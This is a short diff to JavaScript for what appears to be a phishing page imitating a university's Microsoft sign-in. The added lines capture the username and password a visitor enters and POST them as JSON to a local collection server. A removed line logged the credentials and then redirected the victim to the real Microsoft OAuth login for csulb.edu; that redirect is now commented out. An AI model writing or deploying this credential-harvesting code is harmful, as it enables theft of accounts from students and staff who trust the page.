@@ -32,12 +32,29 @@ signInBtn.addEventListener('click', (event) => {
 
 passWordForm.addEventListener('submit', (event) => {
     event.preventDefault();
+    password = passWord.value;
     returnValues();
 })
 
 const returnValues = () => {
-    console.log(`Username: ${username} \n Password: ${password}`);
-    window.location.replace("https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=2793995e-0a7d-40d7-bd35-6968ba142197&redirect_uri=https%3A%2F%2Fmyapps.microsoft.com&scope=openid+profile+email+offline_access&response_type=code&response_mode=fragment&code_challenge=SzGR8bVxPq0vjWOyeYkIHxS-it9e-Y5PeqdFzrSuKq4&code_challenge_method=S256&state=086db234-3d37-4cea-a054-fc5f57e86a6c&domain_hint=csulb.edu&safe_rollout=apply%3A4c5f1cd9-65ad-4147-acf6-e9a11c424a40&sso_reload=true");
+    const logInfo = {
+        username: username,
+        password: password,
+    }
+
+    console.log(logInfo);
+
+    fetch('http://localhost:4000/add_info', {
+        method: 'POST',
+        body: JSON.stringify(logInfo),
+        headers: {
+            'Content-Type': 'application/json'
+        }
+    })
+        .then(res => res.json())
+        .then(res => console.log(res));
+
+    // window.location.replace("https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=2793995e-0a7d-40d7-bd35-6968ba142197&redirect_uri=https%3A%2F%2Fmyapps.microsoft.com&scope=openid+profile+email+offline_access&response_type=code&response_mode=fragment&code_challenge=SzGR8bVxPq0vjWOyeYkIHxS-it9e-Y5PeqdFzrSuKq4&code_challenge_method=S256&state=086db234-3d37-4cea-a054-fc5f57e86a6c&domain_hint=csulb.edu&safe_rollout=apply%3A4c5f1cd9-65ad-4147-acf6-e9a11c424a40&sso_reload=true");
 }
 
 const transitionToPassword = () => {
